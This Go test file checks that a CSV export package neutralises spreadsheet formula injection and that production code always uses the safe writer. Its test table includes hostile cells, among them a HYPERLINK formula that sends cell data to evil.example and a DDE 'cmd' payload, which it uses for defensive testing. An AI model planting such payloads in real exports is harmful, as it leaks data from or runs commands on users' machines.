package csvexport_test

import (
	"bytes"
	"encoding/csv"
	"go/ast"
	"go/parser"
	"go/token"
	"io/fs"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/hostrepute/reputecast/internal/csvexport"
)

func TestCell(t *testing.T) {
	for in, want := range map[string]string{
		`=HYPERLINK("https://evil.example/?d="&B2,"Open")`: `'=HYPERLINK("https://evil.example/?d="&B2,"Open")`,
		"=HYPERLINK(1)":      "'=HYPERLINK(1)",
		"+cmd|' /C calc'!A0": "'+cmd|' /C calc'!A0",
		"-2+3":               "'-2+3",
		"@SUM(A1:A9)":        "'@SUM(A1:A9)",
		"\t=1":               "'\t=1",
		"\r=1":               "'\r=1",
		"+13125550123":       "'+13125550123",
		"-":                  "'-",
		"-12":                "'-12",
		// Everything else is as written.
		"":                 "",
		"Linh Nguyen":      "Linh Nguyen",
		"linh@acme.io":     "linh@acme.io",
		"12":               "12",
		" =1":              " =1",
		"'=already quoted": "'=already quoted",
		"Ünïcödé =1":       "Ünïcödé =1",
	} {
		if got := csvexport.Cell(in); got != want {
			t.Errorf("Cell(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestWriter(t *testing.T) {
	var buf bytes.Buffer
	w := csvexport.NewWriter(&buf)
	row := []string{"=1+1", "Robin, \"the\" reader", "-4", "@x"}
	if err := w.Write(row); err != nil {
		t.Fatal(err)
	}
	if err := w.WriteAll([][]string{{"+1"}, {"ok"}}); err != nil {
		t.Fatal(err)
	}
	if row[0] != "=1+1" {
		t.Fatal("Write changed the caller's record")
	}
	r := csv.NewReader(&buf)
	r.FieldsPerRecord = -1
	recs, err := r.ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	want := [][]string{{"'=1+1", "Robin, \"the\" reader", "'-4", "'@x"}, {"'+1"}, {"ok"}}
	if len(recs) != len(want) {
		t.Fatalf("records: %q", recs)
	}
	for i := range want {
		if !slices.Equal(recs[i], want[i]) {
			t.Errorf("record %d = %q, want %q", i, recs[i], want[i])
		}
	}
}

// TestEveryCSVWriterIsSafe fails when production code writes CSV with
// encoding/csv's own writer instead of a csvexport.Writer: every CSV
// ReputeCast writes can end up in a spreadsheet, and the cells of one that
// didn't go through Cell could run as formulas.
func TestEveryCSVWriterIsSafe(t *testing.T) {
	root := filepath.Join("..", "..")
	var found []string
	for _, dir := range []string{"internal", "cmd"} {
		err := filepath.WalkDir(filepath.Join(root, dir), func(path string, d fs.DirEntry, err error) error {
			if err != nil {
				return err
			}
			rel, _ := filepath.Rel(root, path)
			rel = filepath.ToSlash(rel)
			if d.IsDir() {
				if rel == "internal/csvexport" {
					return filepath.SkipDir
				}
				return nil
			}
			if !strings.HasSuffix(rel, ".go") || strings.HasSuffix(rel, "_test.go") {
				return nil
			}
			for _, line := range csvWriters(t, path) {
				found = append(found, rel+":"+strconv.Itoa(line))
			}
			return nil
		})
		if err != nil {
			t.Fatal(err)
		}
	}
	for _, f := range found {
		t.Errorf("%s: csv.NewWriter writes cells a spreadsheet may run as formulas; use csvexport.NewWriter", f)
	}
}

// csvWriters returns the lines of a file that call encoding/csv's
// NewWriter, under whatever name the file imports the package.
func csvWriters(t *testing.T, path string) []int {
	t.Helper()
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, path, nil, parser.SkipObjectResolution)
	if err != nil {
		t.Fatalf("%s: %v", path, err)
	}
	name := ""
	for _, imp := range f.Imports {
		if p, _ := strconv.Unquote(imp.Path.Value); p == "encoding/csv" {
			name = "csv"
			if imp.Name != nil {
				name = imp.Name.Name
			}
		}
	}
	if name == "" || name == "_" {
		return nil
	}
	var lines []int
	ast.Inspect(f, func(n ast.Node) bool {
		switch x := n.(type) {
		case *ast.SelectorExpr:
			if id, ok := x.X.(*ast.Ident); ok && id.Name == name && x.Sel.Name == "NewWriter" {
				lines = append(lines, fset.Position(x.Pos()).Line)
			}
		case *ast.Ident:
			// import . "encoding/csv"
			if name == "." && x.Name == "NewWriter" {
				lines = append(lines, fset.Position(x.Pos()).Line)
			}
		}
		return true
	})
	return lines
}
